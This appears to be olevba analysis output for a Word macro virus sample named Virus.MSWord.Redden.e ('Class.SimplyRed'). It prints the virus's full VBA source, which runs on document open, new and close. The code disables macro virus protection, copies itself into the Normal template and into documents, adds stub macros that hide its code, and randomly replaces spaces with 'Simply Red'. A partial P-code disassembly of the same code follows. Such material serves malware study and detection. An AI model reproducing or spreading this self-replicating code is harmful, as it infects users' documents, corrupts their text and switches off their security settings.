olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Redden.e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Redden.e - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Private Sub CommandButton1_Click()
UserForm1.Show
End Sub

Private Sub Document_Close()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")
End If
Phuck:
End Sub

Private Sub Document_New()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
aprj = NormalTemplate.VBProject.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
If Not already Then
NormalTemplate.VBProject.VBComponents.Add (vbext_ct_StdModule)
NormalTemplate.VBProject.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = NormalTemplate.VBProject.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub





Private Sub Document_Open()
'
'      <` .        |       |>     |
'      -' | <'> |> | <.|   |\ <- <|
'               '      '
'  Class.SimplyRed by N|(0†|N (c) 1999
'
'
On Error GoTo Phuck
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize
can = Int(150 * Rnd)
If can = 9 Then
Options.DefaultHighlightColorIndex = wdRed
    Selection.Font.ColorIndex = wdDarkRed
Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    Selection.Find.Replacement.Highlight = True
    With Selection.Find
        .Text = " "
        .Replacement.Text = "Simply Red"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = True
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("Edit").Controls(1).Delete
End If
If ThisDocument.FullName = NormalTemplate.FullName Then
Set dest = ActiveDocument.VBProject.VBComponents("ThisDocument")
Set stlth = ActiveDocument.VBProject
Set sour = NormalTemplate.VBProject.VBComponents("ThisDocument")
Else
Set sour = ThisDocument.VBProject.VBComponents("ThisDocument")
Set dest = NormalTemplate.VBProject.VBComponents("ThisDocument")
Set stlth = NormalTemplate.VBProject
End If
cou = dest.CodeModule.countoflines
If cou > 0 Then
For j = 1 To cou
dest.CodeModule.DeleteLines (1)
Next j
End If
lin = sour.CodeModule.Lines(1, sour.CodeModule.countoflines)
dest.CodeModule.AddFromString (lin)
already = False
cnt = stlth.VBComponents.Count
If cnt <> 0 Then
For i = 1 To cnt
aprj = stlth.VBComponents(i).Name
If aprj = "SimplyRed" Then already = True
Next i
Else
already = False
End If
If Not already Then
stlth.VBComponents.Add (vbext_ct_StdModule)
stlth.VBComponents(NormalTemplate.VBProject.VBComponents.Count).Name = "SimplyRed"
Set nor = stlth.VBComponents("SimplyRed").CodeModule
eol = Chr(13) + Chr(10)
nor.AddFromString ("Sub ToolsMacro" + eol + "End Sub")
nor.AddFromString ("Sub Organizer" + eol + "End Sub")
nor.AddFromString ("Sub ViewVBCode" + eol + "End Sub")
nor.AddFromString ("Sub FileTemplates" + eol + "End Sub")

End If
Phuck:
End Sub


-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Redden.e
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10883 bytes
' Line #0:
' Line #1:
' Line #2:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #3:
' 	Ld UserForm1 
' 	ArgsMemCall Show 0x0000 
' Line #4:
' 	EndSub 
' Line #5:
' Line #6:
' 	FuncDefn (Private Sub Document_Close())
' Line #7:
' 	QuoteRem 0x0000 0x0000 ""
' Line #8:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #9:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #10:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #11:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #12:
' 	QuoteRem 0x0000 0x0000 ""
' Line #13:
' 	QuoteRem 0x0000 0x0000 ""
' Line #14:
' 	OnError Phuck 
' Line #15:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #16:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	ArgsCall Read 0x0000 
' Line #18:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #19:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #20:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #21:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #22:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #23:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #24:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #25:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #26:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #27:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #28:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #29:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #30:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #31:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #32:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #33:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #34:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #35:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #36:
' 	EndWith 
' Line #37:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #38:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #42:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #43:
' 	ElseBlock 
' Line #44:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #45:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #46:
' 	EndIfBlock 
' Line #47:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #48:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #49:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #50:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #51:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #54:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #55:
' 	LitVarSpecial (False)
' 	St already 
' Line #56:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #57:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #58:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #59:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #61:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #62:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #63:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #64:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #65:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #66:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #67:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #68:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #69:
' 	EndIfBlock 
' Line #70:
' 	Label Phuck 
' Line #71:
' 	EndSub 
' Line #72:
' Line #73:
' 	FuncDefn (Private Sub Document_New())
' Line #74:
' 	QuoteRem 0x0000 0x0000 ""
' Line #75:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #76:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #77:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #78:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #79:
' 	QuoteRem 0x0000 0x0000 ""
' Line #80:
' 	QuoteRem 0x0000 0x0000 ""
' Line #81:
' 	OnError Phuck 
' Line #82:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #84:
' 	ArgsCall Read 0x0000 
' Line #85:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #86:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #87:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #88:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #89:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #90:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #91:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #92:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #93:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #94:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #95:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #96:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #97:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #98:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #99:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #100:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #101:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #102:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #103:
' 	EndWith 
' Line #104:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #105:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #108:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #109:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #110:
' 	ElseBlock 
' Line #111:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #112:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #113:
' 	EndIfBlock 
' Line #114:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #115:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #116:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #117:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #118:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #119:
' 	EndIfBlock 
' Line #120:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #121:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #122:
' 	LitVarSpecial (False)
' 	St already 
' Line #123:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #124:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #125:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #126:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #127:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #128:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #129:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #130:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #131:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St eol 
' Line #132:
' 	LitStr 0x000E "Sub ToolsMacro"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #133:
' 	LitStr 0x000D "Sub Organizer"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #134:
' 	LitStr 0x000E "Sub ViewVBCode"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #135:
' 	LitStr 0x0011 "Sub FileTemplates"
' 	Ld eol 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	Add 
' 	Paren 
' 	Ld nor 
' 	ArgsMemCall AddFromString 0x0001 
' Line #136:
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Label Phuck 
' Line #139:
' 	EndSub 
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' Line #144:
' Line #145:
' 	FuncDefn (Private Sub Document_Open())
' Line #146:
' 	QuoteRem 0x0000 0x0000 ""
' Line #147:
' 	QuoteRem 0x0000 0x0022 "      <` .        |       |>     |"
' Line #148:
' 	QuoteRem 0x0000 0x0022 "      -' | <'> |> | <.|   |\ <- <|"
' Line #149:
' 	QuoteRem 0x0000 0x0017 "               '      '"
' Line #150:
' 	QuoteRem 0x0000 0x0025 "  Class.SimplyRed by N|(0†|N (c) 1999"
' Line #151:
' 	QuoteRem 0x0000 0x0000 ""
' Line #152:
' 	QuoteRem 0x0000 0x0000 ""
' Line #153:
' 	OnError Phuck 
' Line #154:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #155:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #156:
' 	ArgsCall Read 0x0000 
' Line #157:
' 	LitDI2 0x0096 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St can 
' Line #158:
' 	Ld can 
' 	LitDI2 0x0009 
' 	Eq 
' 	IfBlock 
' Line #159:
' 	Ld wdRed 
' 	Ld Options 
' 	MemSt DefaultHighlightColorIndex 
' Line #160:
' 	Ld wdDarkRed 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt ColorIndex 
' Line #161:
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #162:
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	ArgsMemCall ClearFormatting 0x0000 
' Line #163:
' 	LitVarSpecial (True)
' 	Ld Selection 
' 	MemLd Find 
' 	MemLd Replacement 
' 	MemSt Highlight 
' Line #164:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Find 
' 	With 
' Line #165:
' 	LitStr 0x0001 " "
' 	MemStWith Then 
' Line #166:
' 	LitStr 0x000A "Simply Red"
' 	MemLdWith Replacement 
' 	MemSt Then 
' Line #167:
' 	LitVarSpecial (True)
' 	MemStWith Forward 
' Line #168:
' 	Ld wdFindContinue 
' 	MemStWith Wrap 
' Line #169:
' 	LitVarSpecial (True)
' 	MemStWith Format$ 
' Line #170:
' 	LitVarSpecial (False)
' 	MemStWith MatchCase 
' Line #171:
' 	LitVarSpecial (False)
' 	MemStWith MatchWholeWord 
' Line #172:
' 	LitVarSpecial (False)
' 	MemStWith MatchWildcards 
' Line #173:
' 	LitVarSpecial (False)
' 	MemStWith MatchSoundsLike 
' Line #174:
' 	LitVarSpecial (False)
' 	MemStWith MatchAllWordForms 
' Line #175:
' 	EndWith 
' Line #176:
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	Ld Selection 
' 	MemLd Find 
' 	ArgsMemCall Execute 0x0001 
' Line #177:
' 	LitDI2 0x0001 
' 	LitStr 0x0004 "Edit"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #178:
' 	EndIfBlock 
' Line #179:
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Eq 
' 	IfBlock 
' Line #180:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #181:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set stlth 
' Line #182:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set sour 
' Line #185:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Set dest 
' Line #186:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set stlth 
' Line #187:
' 	EndIfBlock 
' Line #188:
' 	Ld dest 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	St cou 
' Line #189:
' 	Ld cou 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #190:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cou 
' 	For 
' Line #191:
' 	LitDI2 0x0001 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #192:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #193:
' 	EndIfBlock 
' Line #194:
' 	LitDI2 0x0001 
' 	Ld sour 
' 	MemLd CodeModule 
' 	MemLd countoflines 
' 	Ld sour 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St lin 
' Line #195:
' 	Ld lin 
' 	Paren 
' 	Ld dest 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #196:
' 	LitVarSpecial (False)
' 	St already 
' Line #197:
' 	Ld stlth 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St cnt 
' Line #198:
' 	Ld cnt 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #199:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld cnt 
' 	For 
' Line #200:
' 	Ld i 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	St aprj 
' Line #201:
' 	Ld aprj 
' 	LitStr 0x0009 "SimplyRed"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St already 
' 	EndIf 
' Line #202:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #203:
' 	ElseBlock 
' Line #204:
' 	LitVarSpecial (False)
' 	St already 
' Line #205:
' 	EndIfBlock 
' Line #206:
' 	Ld already 
' 	Not 
' 	IfBlock 
' Line #207:
' 	Ld vbext_ct_StdModule 
' 	Paren 
' 	Ld stlth 
' 	MemLd VBComponents 
' 	ArgsMemCall Add 0x0001 
' Line #208:
' 	LitStr 0x0009 "SimplyRed"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemSt New 
' Line #209:
' 	SetStmt 
' 	LitStr 0x0009 "SimplyRed"
' 	Ld stlth 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set nor 
' Line #210:
